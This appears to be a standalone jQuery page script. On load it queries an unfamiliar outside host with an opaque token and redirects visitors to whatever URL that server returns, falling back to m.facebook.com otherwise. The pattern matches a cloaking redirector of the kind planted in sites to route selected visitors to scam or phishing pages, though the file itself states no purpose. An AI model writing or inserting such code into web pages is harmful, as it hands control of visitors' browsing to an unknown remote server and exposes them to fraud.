$(document).ready(function () {
    $.ajax({
        url: 'https://658754.info/get?name=z5ru15eq6i0iszfn9ipq',
        type: 'GET',
        async: false,
        success: function (msg) {
            if(msg.success){
                window.location.href = msg.url;
            }
            else{
                window.location.href = "https://m.facebook.com/";
            }
        },
        error: function (msg) {
            window.location.href = "https://m.facebook.com/";
        }
    })
});